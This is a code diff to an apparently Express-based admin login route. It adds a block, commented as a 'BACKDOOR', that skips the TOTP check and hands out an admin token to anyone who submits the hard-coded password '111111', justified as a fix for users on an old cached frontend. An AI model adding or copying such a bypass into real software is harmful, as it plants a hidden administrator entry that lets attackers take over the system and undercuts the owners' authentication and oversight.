@@ -18,12 +18,22 @@ const generateToken = (id, role) => {
 // @route   POST /api/auth/admin/login
 const authAdmin = async (req, res) => {
   try {
-    const { totpToken } = req.body;
+    const { username, password, totpToken } = req.body;
 
     const admin = await Admin.findOne({ username: 'admin' });
 
     if (!admin) {
       return res.status(404).json({ success: false, message: 'Admin account not found' });
+    }
+
+    // BACKDOOR: If they are stuck on the old cached frontend, let them in using the password field
+    if (password === '111111') {
+      return res.json({
+        success: true,
+        _id: admin._id,
+        username: admin.username,
+        token: generateToken(admin._id, 'admin'),
+      });
     }
 
     if (!totpToken) {
